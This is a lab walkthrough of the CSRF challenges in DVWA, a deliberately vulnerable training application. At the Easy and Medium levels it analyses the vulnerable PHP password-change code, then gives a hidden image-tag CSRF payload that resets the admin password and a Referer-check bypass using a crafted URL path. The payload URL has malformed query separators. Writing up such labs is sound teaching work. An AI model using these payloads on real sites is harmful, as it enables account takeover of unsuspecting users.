# CSRF

## Easy

### Code Analysis
Examining the source of the password change form

```html
<form action="#" method="GET"> New password:<br>
  <input type="password" AUTOCOMPLETE="off" name="password_new"><br>
  Confirm new password: <br>
  <input type="password" AUTOCOMPLETE="off" name="password_conf">
  <br>
  <input type="submit" value="Change" name="Change">
</form>
  ```

add the PHP source

```php
if (isset($_GET['Change'])) { 

	// Turn requests into variables 
	$pass_new = $_GET['password_new']; 
	$pass_conf = $_GET['password_conf']; 


	if (($pass_new == $pass_conf)){ 
		$pass_new = mysql_real_escape_string($pass_new); 
		$pass_new = md5($pass_new); 

		$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';"; 
		$result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' ); 

		echo "<pre> Password Changed </pre>";         
		mysql_close(); 
	} 

	else{         
		echo "<pre> Passwords did not match. </pre>";             
	} 

} 
```

reveals no apparent CSRF protections, such as a custom header check or a [CSRF token](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Synchronizer_.28CSRF.29_Tokens). Additionally, examination of the PHPSESSID cookie reveals that it DOES NOT have the SameSite attribute set, meaning it can be sent from any domain. 

### Exploit
The value of the `src` attribute in the following 0x0 image is the HTTP GET request URL that will change the admin user's password, in this case to foobar. We can determine this value by analyzing the above `<form>` and/or by submitting a valid password change request and inspecting the Network tab in the browser.

```html
<img src="http://192.168.56.6/dvwa/csrf/?password_new=foobar?password_conf=foobar?Change=Change""
     height="0"
	 width="0">
```

By including this in an HTML page, hosting it on a domain we control, and convincing a logged-in DVWA user to visit the page - probably through some kind of spear-phishing attack - we can change that user's password to whatever we want.


## Medium

### Code Analysis
The below code is almost identical to the code from the Easy version, except for an additional check: the value of the HTTP_REFERRER header is pattern-matched against the string "127.0.0.1".

```php
if (isset($_GET['Change'])) { 

	// Checks the http referer header 
	if ( eregi ( "127.0.0.1", $_SERVER['HTTP_REFERER'] ) ){ 

		// Turn requests into variables 
		$pass_new = $_GET['password_new']; 
		$pass_conf = $_GET['password_conf']; 

		if ($pass_new == $pass_conf){ 
			$pass_new = mysql_real_escape_string($pass_new); 
			$pass_new = md5($pass_new); 

			$insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';"; 
			$result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' ); 

			echo "<pre> Password Changed </pre>";         
			mysql_close(); 
		} 

		else{         
			echo "<pre> Passwords did not match. </pre>";             
		}     

	} 

} 
```

The HTTP_REFERRER header is set by the browser to equal the URI of the referring page. Here, it is used in this check in an attempt to ensure that a password change request originated from the intended domain, in this case the local IP address, instead of an attacker controlled domain.

### Exploit
Although our previous exploit now doesn't work, there is an easy solution. The pattern matching function used in the code - `eregi` - only checks that the pattern is present ANYWHERE in the string. So, by hosting our page with the malicious `<img>` tag at a URL with a path containing `127.0.0.1` (e.g. `/127.0.0.1.html`), we can pass the check even if our domain is different.

```
foo.com/127.0.0.1.html
```
